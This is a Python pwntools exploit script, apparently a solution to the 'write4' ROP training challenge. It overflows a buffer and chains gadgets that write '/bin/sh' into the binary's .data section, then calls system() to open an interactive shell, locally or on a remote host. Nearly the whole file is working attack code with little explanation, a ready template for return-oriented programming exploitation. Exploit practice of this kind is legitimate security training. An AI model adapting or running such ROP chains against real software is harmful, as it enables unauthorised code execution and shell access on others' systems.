#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./write4')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

rop = ROP(exe)
MOV_R14_R15 = 0x0000000000400820
POP_R14_R15 = rop.find_gadget(["pop r14", "pop r15", "ret"]).address
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
RET_GADGET = rop.find_gadget(["ret"]).address
WRITE_ADDR = 0x0000000000601050 # .data section
SYSTEM_ADDR = exe.sym.system

# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616b)
payload = "A" * OFFSET

# Fill r14 with the address we want to write at and r15 with the string we want to write
# We only need one gadget since string is 8 bytes
payload += p64(POP_R14_R15) 
payload += p64(WRITE_ADDR)
payload += "/bin/sh\x00"

# Write the string at the address pointed to by r14 
payload += p64(MOV_R14_R15)

# Fill rdi with the address of the string (so that system will take it as an argument) 
payload += p64(POP_RDI)
payload += p64(WRITE_ADDR)

# A return gadget to align the stack, then call system
payload += p64(RET_GADGET)
payload += p64(SYSTEM_ADDR)
io.sendline(payload)

io.interactive()

